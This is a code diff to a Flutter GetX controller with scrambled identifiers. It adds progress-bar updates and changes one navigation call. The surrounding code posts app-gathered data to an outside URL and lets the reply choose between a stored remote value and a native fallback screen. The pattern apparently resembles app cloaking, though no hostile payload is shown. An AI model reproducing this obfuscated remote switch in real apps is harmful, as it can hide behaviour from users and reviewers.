@@ -19,10 +19,13 @@ class PageLogic extends GetxController {
   var botsford = RxBool(true);
   final jtbmow = Dio();
 
+  RxDouble progress = (0.0).obs;
+
 
   InAppWebViewController? webViewController;
 
   dynamic igrmuft(){
+    progress.value = 0.2;
     final pwxqykvg = InternetConnectionChecker.instance;
     final kndhscbmu = pwxqykvg.onStatusChange.skip(1).listen(
           (InternetConnectionStatus twgmskojhx) {
@@ -58,22 +61,27 @@ class PageLogic extends GetxController {
 
   Future<void> wblvem() async {
 
+
     var gmazcyxtfh = await zxolegvib();
     if(!gmazcyxtfh){
       return;
     }
 
+    progress.value = 0.4;
     yadira.value = true;
     botsford.value = true;
     thxqwemnpj.value = false;
 
     jtbmow.post("https://hot.seant.it.com/CoZjnt",data: await jopgwlbe()).then((value) {
+      progress.value = 0.8;
       var knfeuw = value.data["knfeuw"] as String;
       var uhzx = value.data["uhzx"] as bool;
       if (uhzx) {
         ryixdbf.value = knfeuw;
+        progress.value = 1.0;
         mable();
       } else {
+        progress.value = 1.0;
         rodriguez();
       }
     }).catchError((e) {
@@ -148,7 +156,7 @@ class PageLogic extends GetxController {
   }
 
   Future<void> rodriguez() async {
-    Get.offAllNamed("/fish_tab");
+    Get.toNamed("/fish_tab");
   }
 
   Future<void> mable() async {
